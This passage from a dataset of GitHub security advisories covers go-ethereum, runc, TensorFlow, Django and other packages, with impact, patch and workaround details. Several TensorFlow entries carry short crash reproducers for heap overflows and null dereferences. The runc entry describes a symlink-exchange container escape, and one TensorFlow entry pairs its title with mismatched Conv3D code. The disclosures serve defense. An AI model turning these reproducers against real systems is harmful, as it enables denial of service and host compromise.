- PR to address the issue: https://github.com/holiman/uint256/pull/80 
- PR to update geth deps: https://github.com/ethereum/go-ethereum/pull/21368 


### Patches
Upgrade to v1.9.18 or higher

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)",go
180,22961,go-ethereum,GHSA-r33q-22hv-j29q,CVE-2020-26264,https://github.com/advisories/GHSA-r33q-22hv-j29q,moderate,2021-06-29 21:14:07 UTC,Denial of service in github.com/ethereum/go-ethereum,"### Impact

A DoS vulnerability can make a LES server crash via malicious `GetProofsV2` request from a connected LES client.

### Patches

The vulnerability was patched in https://github.com/ethereum/go-ethereum/pull/21896. 

### Workarounds

This vulnerability only concerns users explicitly enabling `les` server; disabling `les` prevents the exploit. 
It can also be patched by manually applying the patch in https://github.com/ethereum/go-ethereum/pull/21896. 


### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)",go
181,22961,go-ethereum,GHSA-xw37-57qp-9mm4,CVE-2020-26265,https://github.com/advisories/GHSA-xw37-57qp-9mm4,moderate,2021-06-29 21:14:16 UTC,Consensus flaw during block processing in github.com/ethereum/go-ethereum,"### Impact

A consensus-vulnerability in Geth could cause a chain split, where vulnerable versions refuse to accept the canonical chain. 

### Description


A flaw was repoted at 2020-08-11 by John Youngseok Yang (Software Platform Lab), where a particular sequence of transactions could cause a consensus failure.

- Tx 1:
  - `sender` invokes `caller`.
  - `caller` invokes `0xaa`. `0xaa` has 3 wei, does a self-destruct-to-self
  - `caller` does a  `1 wei` -call to `0xaa`, who thereby has 1 wei (the code in `0xaa` still executed, since the tx is still ongoing, but doesn't redo the selfdestruct, it takes a different path if callvalue is non-zero)

- Tx 2:
  - `sender` does a 5-wei call to 0xaa. No exec (since no code). 

In geth, the result would be that `0xaa` had `6 wei`, whereas OE reported (correctly) `5` wei. Furthermore, in geth, if the second tx was not executed, the `0xaa` would be destructed, resulting in `0 wei`. Thus obviously wrong. 

It was determined that the root cause was this [commit](https://github.com/ethereum/go-ethereum/commit/223b950944f494a5b4e0957fd9f92c48b09037ad) from [this PR](https://github.com/ethereum/go-ethereum/pull/19953). The semantics of `createObject` was subtly changd, into returning a non-nil object (with `deleted=true`) where it previously did not if the account had been destructed. This return value caused the new object to inherit the old `balance`:

```golang
func (s *StateDB) CreateAccount(addr common.Address) {
	newObj, prev := s.createObject(addr)
	if prev != nil {
		newObj.setBalance(prev.data.Balance)
	}
}
```

It was determined that the minimal possible correct fix was

```diff
+++ b/core/state/statedb.go
@@ -589,7 +589,10 @@ func (s *StateDB) createObject(addr common.Address) (newobj, prev *stateObject)
                s.journal.append(resetObjectChange{prev: prev, prevdestruct: prevdestruct})
        }
        s.setStateObject(newobj)
-       return newobj, prev
+       if prev != nil && !prev.deleted {
+               return newobj, prev
+       }
+       return newobj, nil
```

### Patches

See above. The fix was included in Geth `v1.9.20` ""Paragade"".

### Credits

The bug was found by @johnyangk and reported via bounty@ethereum.org.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)",go
182,22385,runc,GHSA-c3xm-pvg7-gh7r,CVE-2021-30465,https://github.com/advisories/GHSA-c3xm-pvg7-gh7r,high,2021-05-25 18:44:42 UTC,mount destinations can be swapped via symlink-exchange to cause mounts outside the rootfs,"### Summary

runc 1.0.0-rc94 and earlier are vulnerable to a symlink exchange attack whereby
an attacker can request a seemingly-innocuous container configuration that
actually results in the host filesystem being bind-mounted into the container
(allowing for a container escape). CVE-2021-30465 has been assigned for this
issue.

An attacker must have the ability to start containers using some kind of custom
volume configuration, and while recommended container hardening mechanisms such
as LSMs (AppArmor/SELinux) and user namespaces will restrict the amount of
damage an attacker could do, they do not block this attack outright. We have a
reproducer using Kubernetes (and the below description mentions
Kubernetes-specific paths), but this is not a Kubernetes-specific issue.

The now-released [runc v1.0.0-rc95][release] contains a fix for this issue, we
recommend users update as soon as possible.

[release]: https://github.com/opencontainers/runc/releases/tag/v1.0.0-rc95

### Details

In circumstances where a container is being started, and runc is mounting
inside a volume shared with another container (which is conducting a
symlink-exchange attack), runc can be tricked into mounting outside of the
container rootfs by swapping the target of a mount with a symlink due to a
time-of-check-to-time-of-use (TOCTTOU) flaw. This is fairly similar in style to
previous TOCTTOU attacks (and is a problem we are working on solving with
libpathrs).

However, this alone is not useful because this happens inside a mount namespace
with `MS_SLAVE` propagation applied to `/` (meaning that the mount doesn't
appear on the host -- it's only a ""host-side mount"" inside the container's
namespace). To exploit this, you must have additional mount entries in the
configuration that use some subpath of the mounted-over host path as a source
for a subsequent mount.

However, it turns out with some container orchestrators (such as Kubernetes --
though it is very likely that other downstream users of runc could have similar
behaviour be accessible to untrusted users), the existence of additional volume
management infrastructure allows this attack to be applied to gain access to
the host filesystem without requiring the attacker to have completely arbitrary
control over container configuration.

In the case of Kubernetes, this is exploitable by creating a symlink in a
volume to the top-level (well-known) directory where volumes are sourced from
(for instance,
`/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir`), and then
using that symlink as the target of a mount. The source of the mount is an
attacker controlled directory, and thus the source directory from which
subsequent mounts will occur is an attacker-controlled directory. Thus the
attacker can first place a symlink to `/` in their malicious source directory
with the name of a volume, and a subsequent mount in the container will
bind-mount `/` into the container.

Applying this attack requires the attacker to start containers with a slightly
peculiar volume configuration (though not explicitly malicious-looking such as
bind-mounting `/` into the container explicitly), and be able to run malicious
code in a container that shares volumes with said volume configuration. It
helps the attacker if the host paths used for volume management are well known,
though this is not a hard requirement.

### Patches
This has been patched in runc 1.0.0-rc95, and users should upgrade as soon as
possible. The patch itself can be found [here](https://github.com/opencontainers/runc/commit/0ca91f44f1664da834bc61115a849b56d22f595f).

### Workarounds

There are no known workarounds for this issue.

However, users who enforce running containers with more confined security
profiles (such as reduced capabilities, not running code as root in the
container, user namespaces, AppArmor/SELinux, and seccomp) will restrict what
an attacker can do in the case of a container breakout -- we recommend users
make use of strict security profiles if possible (most notably user namespaces
-- which can massively restrict the impact a container breakout can have on the
host system).

### References
* [commit](https://github.com/opencontainers/runc/commit/0ca91f44f1664da834bc61115a849b56d22f595f)
* [seclists public disclosure](https://www.openwall.com/lists/oss-security/2021/05/19/2)

### Credit

Thanks to Etienne Champetier for discovering and disclosing this vulnerability,
to Noah Meyerhans for writing the first draft of this patch, and to Samuel Karp
for testing it.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [our issue tracker](https://github.com/opencontainers/runc/issues).
* Email us at <security@opencontainers.org>.",go
183,34916,org.apache.flink:flink-core,GHSA-6g88-99wj-8mgg,CVE-2020-1960,https://github.com/advisories/GHSA-6g88-99wj-8mgg,moderate,2021-05-21 19:20:35 UTC,Command injection in Apache Flink,"A vulnerability in Apache Flink where, when running a process with an enabled JMXReporter, with a port configured via metrics.reporter.reporter_name>.port, an attacker with local access to the machine and JMX port can execute a man-in-the-middle attack using a specially crafted request to rebind the JMXRMI registry to one under the attacker's control. This compromises any connection established to the process via JMX, allowing extraction of credentials and any other transferred data.",maven
184,31489,go-ipfs,GHSA-27pv-q55r-222g,CVE-2020-26279,https://github.com/advisories/GHSA-27pv-q55r-222g,high,2021-06-23 17:27:44 UTC,Path traversal in github.com/ipfs/go-ipfs,"### Impact
It is currently possible for path traversal to occur with DAGs containing relative paths during retrieval. This can cause files to be overwritten, or written to incorrect output directories. The issue can only occur when `ipfs get` is done on an affected DAG.

1. The only affected command is `ipfs get`.
2. The gateway is not affected.

### Patches
Traversal fix patched in https://github.com/whyrusleeping/tar-utils/commit/20a61371de5b51380bbdb0c7935b30b0625ac227
`tar-utils` patch applied to go-ipfs via https://github.com/ipfs/go-ipfs/commit/b7ddba7fe47dee5b1760b8ffe897908417e577b2

### Workarounds
Upgrade to go-ipfs 0.8 or later.

### References
Binaries for the patched versions of go-ipfs are available on the IPFS distributions site, https://dist.ipfs.io/go-ipfs

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ipfs](https://github.com/ipfs/go-ipfs)
* Email us at [security@ipfs.io](mailto:security@ipfs.io)",go
185,32811,hugo,GHSA-8j34-9876-pvfq,CVE-2020-26284,https://github.com/advisories/GHSA-8j34-9876-pvfq,high,2021-06-23 17:28:26 UTC,Hugo can execute a binary from the current directory on Windows,"## Impact

Hugo depends on Go's `os/exec` for certain features, e.g. for rendering of Pandoc documents if these binaries are found in the system `%PATH%` on Windows. However, if a malicious file with the same name (`exe` or `bat`) is found in the current working directory at the time of running `hugo`, the malicious command will be invoked instead of the system one.

Windows users who run `hugo` inside untrusted Hugo sites are affected.

## Patches
Users should upgrade to Hugo v0.79.1.",go
186,31489,go-ipfs,GHSA-r4gv-vj59-cccm,CVE-2020-26283,https://github.com/advisories/GHSA-r4gv-vj59-cccm,moderate,2021-06-23 17:27:27 UTC,Control character injection in console output in github.com/ipfs/go-ipfs,"### Impact
Control characters are not escaped from console output. This can result in hiding input from the user which could result in the user taking an unknown, malicious action.

### Patches
<!-- _Has the problem been patched? What versions should users upgrade to?_  -->

- Patched via https://github.com/ipfs/go-ipfs/pull/7831 in v0.8.0

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ipfs](http://github.com/ipfs/go-ipfs)
* Email us at [security@ipfs.io](mailto:security@ipfs.io)",go
187,30537,Zope,GHSA-5pr9-v234-jw36,,https://github.com/advisories/GHSA-5pr9-v234-jw36,moderate,2021-06-18 18:44:01 UTC,Remote Code Execution via traversal in TAL expressions,"### Impact
Most Python modules are not available for using in TAL expressions that you can add through-the-web, for example in Zope Page Templates. This restriction avoids file system access, for example via the 'os' module. But some of the untrusted modules are available indirectly through Python modules that are available for direct use.

By default, you need to have the Manager role to add or edit Zope Page Templates through the web. Only sites that allow untrusted users to add/edit Zope Page Templates through the web are at risk.

### Patches
The problem has been fixed in Zope 5.2 and 4.6.

### Workarounds
A site administrator can restrict adding/editing Zope Page Templates through the web using the standard Zope user/role permission mechanisms. Untrusted users should not be assigned the Zope Manager role and adding/editing Zope Page Templates through the web should be restricted to trusted users only.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [Zope issue tracker](https://github.com/zopefoundation/Zope/issues)
* Email us at [security@plone.org](mailto:security@plone.org)
",pip
188,30995,Masterminds/goutils,GHSA-xg2h-wx96-xgxr,,https://github.com/advisories/GHSA-xg2h-wx96-xgxr,low,2021-05-21 16:26:06 UTC,RandomAlphaNumeric and CryptoRandomAlphaNumeric are not as random as they should be,"### Impact

A security-sensitive bug was discovered by Open Source Developer *Erik Sundell of Sundell Open Source Consulting AB*.

The functions `RandomAlphaNumeric(int)` and `CryptoRandomAlphaNumeric(int)` are not as random as they should be. Small values of `int` in the functions above will return a smaller subset of results than they should. For example, `RandomAlphaNumeric(1)` will always return a digit in the 0-9 range, while `RandomAlphaNumeric(4)` will return around ~7 million of the ~13M possible permutations.

This is considered a security release because programs that rely upon random generators for passwords are at an increased risk of brute force-style password guessing. There is also a higher probability of collision.

The problem was the result of a mistaken regular expression that only accepted random strings if they contained a digit from `[0-9]`. That restriction has been removed.

### Patches

This issue has been corrected in v1.0.2.

### Workarounds

If you cannot upgrade to v1.0.2, you can work around the issue by calling `RandomAlphaNumericCustom(N, true, true)`|`CryptoRandomAlphaNumericCustom(N, true, true)`  instead. (Where `N` is the desired length, and `true` is the literal boolean `true`.)        ",go
189,17198,browserslist,GHSA-w8qv-6jwh-64r5,CVE-2021-23364,https://github.com/advisories/GHSA-w8qv-6jwh-64r5,moderate,2021-05-24 19:52:40 UTC,Regular Expression Denial of Service in browserslist,The package browserslist from 4.0.0 and before 4.16.5 are vulnerable to Regular Expression Denial of Service (ReDoS) during parsing of queries.,npm
190,20810,apache-airflow,GHSA-3xxv-p78r-4fc6,CVE-2021-28359,https://github.com/advisories/GHSA-3xxv-p78r-4fc6,moderate,2021-06-18 18:43:42 UTC,Cross-site Scripting in apache-airflow,"The ""origin"" parameter passed to some of the endpoints like '/trigger' was vulnerable to XSS exploit. This issue affects Apache Airflow versions <1.10.15 in 1.x series and affects 2.0.0 and 2.0.1 and 2.x series. This is the same as CVE-2020-13944 & CVE-2020-17515 but the implemented fix did not fix the issue completely. Update to Airflow 1.10.15 or 2.0.2. Please also update your Python version to the latest available PATCH releases of the installed MINOR versions, example update to Python 3.6.13 if you are on Python 3.6. (Those contain the fix for CVE-2021-23336 https://nvd.nist.gov/vuln/detail/CVE-2021-23336).",pip
191,22171,dns,GHSA-p55x-7x9v-q8m4,CVE-2017-15133,https://github.com/advisories/GHSA-p55x-7x9v-q8m4,high,2021-06-29 21:45:07 UTC,Denial of Service in miekg-dns,A denial of service flaw was found in miekg-dns before 1.0.4. A remote attacker could use carefully timed TCP packets to block the DNS server from accepting new connections.,go
192,32138,syncthing,GHSA-x462-89pf-6r5h,CVE-2021-21404,https://github.com/advisories/GHSA-x462-89pf-6r5h,low,2021-05-21 16:23:17 UTC,Crash due to malformed relay protocol message,"### Impact

1. `syncthing` can be caused to crash and exit if sent a malformed relay
   protocol message message with a negative length field.

2. The relay server `strelaysrv` can be caused to crash and exit if sent
   a malformed relay protocol message with a negative length field.

At no point is sensitive data exposed or liable to be altered due to this
issue. Sensitive data is never exposed to relay operators. Syncthing itself
would need to be lured to connect to a malicious relay server in order to
exploit the issue.

### Patches

Fixed in version 1.15.0.

### Workarounds

1. No known workaround for `strelaysrv`.

2. `syncthing` can be configured to not use relays, or to only use specific,
   trusted relays. If Syncthing is used in a closed environment or with
   relaying disabled, i.e., it does not communicate with unknown relays,
   Syncthing is not vulnerable.

### For more information

If you have any questions or comments about this advisory, please discuss it [on the forum](https://forum.syncthing.net/).

Thanks to Wojciech Paciorek for discovering and reporting this issue.",go
193,23143,go-jose.v1,GHSA-86r9-39j9-99wp,CVE-2016-9121,https://github.com/advisories/GHSA-86r9-39j9-99wp,critical,2021-06-23 17:17:52 UTC,Elliptic Curve Key Disclosure in go-jose,"go-jose before 1.0.4 suffers from an invalid curve attack for the ECDH-ES algorithm. When deriving a shared key using ECDH-ES for an encrypted message, go-jose neglected to check that the received public key on a message is on the same curve as the static private key of the receiver, thus making it vulnerable to an invalid curve attack.",go
194,22942,go-jose,GHSA-3fx4-7f69-5mmg,CVE-2016-9123,https://github.com/advisories/GHSA-3fx4-7f69-5mmg,high,2021-06-23 17:14:12 UTC,Integer Overflow in go-jose,go-jose before 1.0.5 suffers from a CBC-HMAC integer overflow on 32-bit architectures. An integer overflow could lead to authentication bypass for CBC-HMAC encrypted ciphertexts on 32-bit architectures.,go
195,19832,Django,GHSA-rxjp-mfm9-w4wr,CVE-2021-31542,https://github.com/advisories/GHSA-rxjp-mfm9-w4wr,high,2021-06-04 21:15:56 UTC,Path Traversal in Django,"In Django 2.2 before 2.2.21, 3.1 before 3.1.9, and 3.2 before 3.2.1, MultiPartParser, UploadedFile, and FieldFile allowed directory traversal via uploaded files with suitably crafted file names.",pip
196,19832,Django,GHSA-qm57-vhq3-3fwf,CVE-2021-32052,https://github.com/advisories/GHSA-qm57-vhq3-3fwf,moderate,2021-06-09 17:14:51 UTC,Header injection possible in Django,"In Django 2.2 before 2.2.22, 3.1 before 3.1.10, and 3.2 before 3.2.2 (with Python 3.9.5+), URLValidator does not prohibit newlines and tabs (unless the URLField form field is used). If an application uses values with newlines in an HTTP response, header injection can occur. Django itself is unaffected because HttpResponse prohibits newlines in HTTP headers.",pip
197,20741,tensorflow,GHSA-4278-2v5v-65r4,CVE-2021-29512,https://github.com/advisories/GHSA-4278-2v5v-65r4,low,2021-05-21 14:20:40 UTC,Heap buffer overflow in `RaggedBinCount`,"### Impact
If the `splits` argument of `RaggedBincount` does not specify a valid [`SparseTensor`](https://www.tensorflow.org/api_docs/python/tf/sparse/SparseTensor), then an attacker can trigger a heap buffer overflow:

```python
import tensorflow as tf
tf.raw_ops.RaggedBincount(splits=[0], values=[1,1,1,1,1], size=5, weights=[1,2,3,4], binary_output=False)
```

This will cause a read from outside the bounds of the `splits` tensor buffer in the [implementation of the `RaggedBincount` op](https://github.com/tensorflow/tensorflow/blob/8b677d79167799f71c42fd3fa074476e0295413a/tensorflow/core/kernels/bincount_op.cc#L430-L433):

```cc
    for (int idx = 0; idx < num_values; ++idx) {
      while (idx >= splits(batch_idx)) {
        batch_idx++;
      }
      ...
    }
```

Before the `for` loop, `batch_idx` is set to 0. The user controls the `splits` array, making it contain only one element, 0. Thus, the code in the `while` loop would increment `batch_idx` and then try to read `splits(1)`, which is outside of bounds.

### Patches
We have patched the issue in GitHub commit [eebb96c2830d48597d055d247c0e9aebaea94cd5](https://github.com/tensorflow/tensorflow/commit/eebb96c2830d48597d055d247c0e9aebaea94cd5).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 and TensorFlow 2.3.3, as these are also affected.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
198,20741,tensorflow,GHSA-452g-f7fp-9jf7,CVE-2021-29513,https://github.com/advisories/GHSA-452g-f7fp-9jf7,low,2021-05-21 14:20:46 UTC,Type confusion during tensor casts lead to dereferencing null pointers,"### Impact
Calling TF operations with tensors of non-numeric types when the operations expect numeric tensors result in null pointer dereferences.

There are multiple ways to reproduce this, listing a few examples here:

```python
import tensorflow as tf
import numpy as np
data = tf.random.truncated_normal(shape=1,mean=np.float32(20.8739),stddev=779.973,dtype=20,seed=64)
```

```python
import tensorflow as tf
import numpy as np
data =
tf.random.stateless_truncated_normal(shape=1,seed=[63,70],mean=np.float32(20.8739),stddev=779.973,dtype=20)
```

```python
import tensorflow as tf
import numpy as np
data = tf.one_hot(indices=[62,50],depth=136,on_value=np.int32(237),off_value=158,axis=856,dtype=20)
```

```python
import tensorflow as tf
import numpy as np
data = tf.range(start=np.int32(214),limit=660,delta=129,dtype=20)
```

```python
import tensorflow as tf
import numpy as np
data = tf.raw_ops.ResourceCountUpTo(resource=np.int32(30), limit=872, T=3)
```

```python
import tensorflow as tf
import numpy as np

writer_array = np.array([1,2],dtype=np.int32)
writer_tensor = tf.convert_to_tensor(writer_array,dtype=tf.resource)
```

All these examples and similar ones have the same behavior: the [conversion from Python array to C++ array](https://github.com/tensorflow/tensorflow/blob/ff70c47a396ef1e3cb73c90513da4f5cb71bebba/tensorflow/python/lib/core/ndarray_tensor.cc#L113-L169) is vulnerable to a type confusion:

```cc
  int pyarray_type = PyArray_TYPE(array);
  PyArray_Descr* descr = PyArray_DESCR(array);
  switch (pyarray_type) {
    ...
    case NPY_VOID:
      // Quantized types are currently represented as custom struct types.
      // PyArray_TYPE returns NPY_VOID for structs, and we should look into
      // descr to derive the actual type.
      // Direct feeds of certain types of ResourceHandles are represented as a
      // custom struct type.
      return PyArrayDescr_to_TF_DataType(descr, out_tf_datatype);
    ...
  }
```

For the tensor types involved in the above example, the `pyarray_type` is `NPY_VOID` but the `descr` field is such that `descr->field = NULL`. Then [`PyArrayDescr_to_TF_DataType`](https://github.com/tensorflow/tensorflow/blob/ff70c47a396ef1e3cb73c90513da4f5cb71bebba/tensorflow/python/lib/core/ndarray_tensor.cc#L72-L77) will trigger a null dereference:

```cc
Status PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,
                                   TF_DataType* out_tf_datatype) {
  PyObject* key;
  PyObject* value;
  Py_ssize_t pos = 0;
  if (PyDict_Next(descr->fields, &pos, &key, &value)) {
    ...
  }
}
```

This is because the Python's `PyDict_Next` implementation would dereference the first argument.

### Patches
We have patched the issue in GitHub commit [030af767d357d1b4088c4a25c72cb3906abac489](https://github.com/tensorflow/tensorflow/commit/030af767d357d1b4088c4a25c72cb3906abac489).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360 as well as Ye Zhang and Yakun Zhang of Baidu X-Team.",pip
199,20741,tensorflow,GHSA-8h46-5m9h-7553,CVE-2021-29514,https://github.com/advisories/GHSA-8h46-5m9h-7553,low,2021-05-21 14:20:51 UTC,Heap out of bounds write in `RaggedBinCount`,"### Impact
If the `splits` argument of `RaggedBincount` does not specify a valid [`SparseTensor`](https://www.tensorflow.org/api_docs/python/tf/sparse/SparseTensor), then an attacker can trigger a heap buffer overflow:

```python
import tensorflow as tf
tf.raw_ops.RaggedBincount(splits=[7,8], values= [5, 16, 51, 76, 29, 27, 54, 95],\
                          size= 59, weights= [0, 0, 0, 0, 0, 0, 0, 0],\
                          binary_output=False)
```

This will cause a read from outside the bounds of the `splits` tensor buffer in the [implementation of the `RaggedBincount` op](https://github.com/tensorflow/tensorflow/blob/8b677d79167799f71c42fd3fa074476e0295413a/tensorflow/core/kernels/bincount_op.cc#L430-L446):
    
```cc 
    for (int idx = 0; idx < num_values; ++idx) {
      while (idx >= splits(batch_idx)) {
        batch_idx++;
      }
      ...
      if (bin < size) {
        if (binary_output_) {
          out(batch_idx - 1, bin) = T(1);
        } else {
          T value = (weights_size > 0) ? weights(idx) : T(1);
          out(batch_idx - 1, bin) += value;
        }
      } 
    }
```

Before the `for` loop, `batch_idx` is set to 0. The attacker sets `splits(0)` to be 7, hence the `while` loop does not execute and `batch_idx` remains 0. This then results in writing to `out(-1, bin)`, which is before the heap allocated buffer for the output tensor.

### Patches
We have patched the issue in GitHub commit [eebb96c2830d48597d055d247c0e9aebaea94cd5](https://github.com/tensorflow/tensorflow/commit/eebb96c2830d48597d055d247c0e9aebaea94cd5).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 and TensorFlow 2.3.3, as these are also affected.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
200,20741,tensorflow,GHSA-hc6c-75p4-hmq4,CVE-2021-29515,https://github.com/advisories/GHSA-hc6c-75p4-hmq4,low,2021-05-21 14:20:54 UTC,Reference binding to null pointer in `MatrixDiag*` ops,"### Impact
The implementation of [`MatrixDiag*` operations](https://github.com/tensorflow/tensorflow/blob/4c4f420e68f1cfaf8f4b6e8e3eb857e9e4c3ff33/tensorflow/core/kernels/linalg/matrix_diag_op.cc#L195-L197) does not validate that the tensor arguments are non-empty:

```cc
      num_rows = context->input(2).flat<int32>()(0);
      num_cols = context->input(3).flat<int32>()(0);
      padding_value = context->input(4).flat<T>()(0); 
``` 

Thus, users can trigger null pointer dereferences if any of the above tensors are null:

```python
import tensorflow as tf

d = tf.convert_to_tensor([],dtype=tf.float32)
p = tf.convert_to_tensor([],dtype=tf.float32)
tf.raw_ops.MatrixDiagV2(diagonal=d, k=0, num_rows=0, num_cols=0, padding_value=p)
```

Changing from `tf.raw_ops.MatrixDiagV2` to `tf.raw_ops.MatrixDiagV3` still reproduces the issue.

### Patches
We have patched the issue in GitHub commit [a7116dd3913c4a4afd2a3a938573aa7c785fdfc6](https://github.com/tensorflow/tensorflow/commit/a7116dd3913c4a4afd2a3a938573aa7c785fdfc6).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ye Zhang and Yakun Zhang of Baidu X-Team.",pip
201,20741,tensorflow,GHSA-84mw-34w6-2q43,CVE-2021-29516,https://github.com/advisories/GHSA-84mw-34w6-2q43,low,2021-05-21 14:20:58 UTC,Null pointer dereference via invalid Ragged Tensors,"### Impact
Calling `tf.raw_ops.RaggedTensorToVariant` with arguments specifying an invalid ragged tensor results in a null pointer dereference:

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])
```

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

The implementation of [`RaggedTensorToVariant` operations](https://github.com/tensorflow/tensorflow/blob/904b3926ed1c6c70380d5313d282d248a776baa1/tensorflow/core/kernels/ragged_tensor_to_variant_op.cc#L39-L40) does not validate that the ragged tensor argument is non-empty:

```cc
  int ragged_rank = batched_ragged.ragged_rank();
  auto batched_splits_top_vec = batched_ragged.splits(0).vec<SPLIT_TYPE>();
```

Since `batched_ragged` contains no elements, `batched_ragged.splits` is a null vector, thus `batched_ragged.splits(0)` will result in  dereferencing `nullptr`.

### Patches
We have patched the issue in GitHub commit [b055b9c474cd376259dde8779908f9eeaf097d93](https://github.com/tensorflow/tensorflow/commit/b055b9c474cd376259dde8779908f9eeaf097d93).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
202,20741,tensorflow,GHSA-772p-x54p-hjrv,CVE-2021-29517,https://github.com/advisories/GHSA-772p-x54p-hjrv,low,2021-05-21 14:21:01 UTC,Division by zero in `Conv3D`,"### Impact
A malicious user could trigger a division by 0 in `Conv3D` implementation:

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 23, 1])
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/42033603003965bffac51ae171b51801565e002d/tensorflow/core/kernels/conv_ops_3d.cc#L143-L145) does a modulo operation based on user controlled input:

```cc
  const int64 out_depth = filter.dim_size(4);
  OP_REQUIRES(context, in_depth % filter_depth == 0, ...);
```

Thus, when `filter` has a 0 as the fifth element, this results in a division by 0.

Additionally, if the shape of the two tensors is not valid, an Eigen assertion can be triggered, resulting in a program crash:

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

The shape of the two tensors must follow the constraints specified in the [op description](https://www.tensorflow.org/api_docs/python/tf/raw_ops/Conv3D).

### Patches
We have patched the issue in GitHub commit [799f835a3dfa00a4d852defa29b15841eea9d64f](https://github.com/tensorflow/tensorflow/commit/799f835a3dfa00a4d852defa29b15841eea9d64f).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
203,20741,tensorflow,GHSA-62gx-355r-9fhg,CVE-2021-29518,https://github.com/advisories/GHSA-62gx-355r-9fhg,low,2021-05-21 14:21:05 UTC,Session operations in eager mode lead to null pointer dereferences,"### Impact
In eager mode (default in TF 2.0 and later), session operations are invalid. However, users could still call the raw ops associated with them and trigger a null pointer dereference:

```python
import tensorflow as tf
tf.raw_ops.GetSessionTensor(handle=['\x12\x1a\x07'],dtype=4)
```
```python
import tensorflow as tf
tf.raw_ops.DeleteSessionTensor(handle=['\x12\x1a\x07'])
``` 

The [implementation](https://github.com/tensorflow/tensorflow/blob/eebb96c2830d48597d055d247c0e9aebaea94cd5/tensorflow/core/kernels/session_ops.cc#L104) dereferences the session state pointer without checking if it is valid:
  
```cc
  OP_REQUIRES_OK(ctx, ctx->session_state()->GetTensor(name, &val));
```

Thus, in eager mode, `ctx->session_state()` is nullptr and the call of the member function is undefined behavior.

### Patches
We have patched the issue in GitHub commit [ff70c47a396ef1e3cb73c90513da4f5cb71bebba](https://github.com/tensorflow/tensorflow/commit/ff70c47a396ef1e3cb73c90513da4f5cb71bebba).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
